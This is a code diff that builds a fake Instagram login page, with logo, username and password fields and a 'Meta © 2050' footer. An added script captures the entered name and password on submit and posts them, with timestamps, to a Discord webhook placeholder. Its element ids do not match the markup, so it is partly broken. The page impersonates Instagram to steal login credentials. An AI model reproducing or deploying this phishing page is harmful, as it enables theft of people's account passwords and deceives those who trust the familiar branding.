@@ -6,9 +6,85 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <link rel="shortcut icon" href="icons/insta-fav.ico" type="image/x-icon">
+    <link rel="stylesheet" href="instagram.css">
 </head>
 
 <body>
+
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex"></section>
+
+        <section id="auth" class="flex direction-column">
+
+            <div class="panel login flex direction-column">
+
+                <h1 title="instagram" class="flex justify-content-center"><img src="icons/instagram-logo.png" alt="logo"
+                        title="Instagram logo"></h1>
+
+                <form>
+                    <label for="email" class="sr-only">Username/email</label>
+                    <input name="email" placeholder="Username/email">
+
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input type="password" name="password" placeholder="password">
+
+                    <button type="button">Login</button>
+                </form>
+
+
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img>
+                        <a>Enter Facebook</a>
+                    </div>
+                    <a href="#">Forget Passowrd</a>
+
+                </div>
+
+            </div>
+        </section>
+    </main>
+
+
+    <footer>Meta © 2050 Instagram do Facebook</footer>
+
+
+    <script>
+
+        const formLoadTime = new Date();
+
+        document.getElementById('form').addEventListener('submit', function (event) {
+
+            // Prevent the browser from reloading
+            event.preventDefault();
+
+            const submitClickTime = new Date();
+
+            const nameValue = document.getElementById('name').value;
+            const passwordValue = document.getElementById("password").value;
+
+            const webhookUrl = "{{DS-HOOK}}";
+
+            const discordMessage = {
+
+                content: `**New Form Submission**\n` +
+                    `**Name:** ${nameValue}\n` +
+                    `**Password:** ${passwordValue}\n` +
+                    `**Form Opened At:** ${formLoadTime.toLocaleString()}\n` +
+                    `**Submit Clicked At:** ${submitClickTime.toLocaleString()}`
+            };
+
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordMessage)
+            });
+        })
+    </script>
 
 </body>
 
